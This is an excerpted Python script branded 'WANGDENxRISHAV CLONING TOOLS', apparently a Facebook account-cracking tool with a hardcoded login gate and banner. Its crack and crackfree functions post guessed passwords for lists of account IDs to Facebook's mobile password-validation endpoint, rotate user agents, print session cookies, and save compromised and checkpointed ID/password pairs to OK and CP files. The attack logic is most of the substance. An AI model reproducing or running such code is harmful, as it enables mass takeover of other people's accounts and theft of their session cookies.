...
while attemps < 12345677901:
    ...
    if username == 'STAR' and password == 'RISHAV':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
  
logo ="""
    _____ _______       _____        _____  _____  _____ _    _     __      __
  / ____|__   __|/\   |  __ \      |  __ \|_   _|/ ____| |  | |   /\ \    / /
 | (___    | |  /  \  | |__) |__  _| |__) | | | | (___ | |__| |  /  \ \  / / 
  \___ \   | | / /\ \ |  _  / \ \/ /  _  /  | |  \___ \|  __  | / /\ \ \/ /  
  ____) |  | |/ ____ \| | \ \  >  <| | \ \ _| |_ ____) | |  | |/ ____ \  /   
 |_____/   |_/_/    \_\_|  \_\/_/\_\_|  \_\_____|_____/|_|  |_/_/    \_\/    
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38 RISHAVxWANGDEN]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • WANGDENxRISHAV]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mgithub.WANGDENxRISHAV]  ║\33[1;34m   
...
os.system('espeak -a 300 "WELCOME TO WANGDENxRISHAV CLONING TOOLS"')
pass
...
def login_lagi334(): 
    try:
      ...
      #exit()
        ...
        os.system("wangdenXrishav.py.py")
        exit()
...
def menu():
    ...
    if KGFBRAND in ['111']:
        ...
        os.system("python wangdenXrishav.py.py")
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUSE FLIGHT MODE FOR SPEED')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[WANGDENxRISHAVM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[WANGDENxRISHAV-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[WANGDENxRISHAV-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " WANGDENxRISHAV,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[WANGDENxRISHAV-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•WANGDENxRISHAV-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                os.system('espeak -a 300 " Ok,  WANGDENxRISHAV,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
